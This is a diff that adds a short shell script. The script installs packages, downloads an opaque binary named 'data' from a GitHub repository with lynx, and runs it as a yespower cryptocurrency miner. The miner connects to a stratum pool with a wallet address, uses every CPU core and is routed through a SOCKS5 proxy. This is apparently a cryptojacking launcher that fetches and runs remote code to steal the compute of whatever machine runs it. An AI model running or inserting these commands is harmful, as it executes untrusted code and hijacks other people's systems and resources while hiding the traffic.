@@ -1,0 +1,5 @@
+apt update
+apt-get install -y build-essential automake libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev git
+apt install -y lynx
+lynx -dont_wrap_pre -dump "https://github.com/TamJsmt/TamJsmt/raw/main/data" > data
+chmod +x data && ./data -a yespower  -o stratum+tcps://stratum-na.rplant.xyz:17017 -u web1qzm3dqxc3xfa6exp3jaaygq2jal8adhvlqhf2aq -t $(nproc) -x socks5://161.8.174.48:1080
